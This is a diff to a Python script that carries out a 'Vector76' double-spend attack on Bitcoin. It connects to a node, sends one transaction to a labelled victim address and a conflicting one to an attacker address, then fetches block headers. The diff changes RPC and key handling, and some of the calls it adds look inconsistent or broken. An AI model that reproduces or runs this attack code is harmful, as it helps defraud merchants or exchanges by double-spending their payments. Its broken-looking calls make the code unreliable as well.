@@ -1,6 +1,7 @@
 import time
 import bitcoin
 import argparse
+import bitcoin.blocks
 import requests
 import subprocess
 
@@ -147,7 +148,9 @@ prev_txid  = args.prev_deposit_TXID
 #if network == "mainnet":
 
 print("Connecting Node...")
-rpc_node = Bitcoin(username, password, rpc_host, rpc_port)
+rpc_node = Bitcoin(rpcuser=username, rpcpasswd=password, rpchost=rpc_host, rpcport=rpc_port)
+info = rpc_node.submitblock("0")
+print(info)
 print("--------------------")
 print(f"Send Amount (BTC)     : {amount_BTC}")
 print(f"Victim   Address      : {victim_address}")
@@ -159,14 +162,15 @@ input(" --- Press the enter key to continue the Vector76 attack... --- ")
 #print(amount_satoshi)
 #fee_satoshi = 1500
 print("push T1")
-key = Key(key)
+#key = Key(key)
+bitcoin.add_privkeys(key)
 #send_amount = amount_satoshi - fee_satoshi
 tx_victim = [(victim_address, amount_BTC, "btc")]
-key.send(tx_victim)
+bitcoin.send(tx_victim)
 
 print("push T2")
 tx_attacker = [(attacker_address, amount_BTC, "btc")]
-key.send(tx_attacker)
+bitcoin.send(tx_attacker)
 print()
 print("Request Blockheader...")
 block_header_V = get_block_header_by_txid(prev_txid)
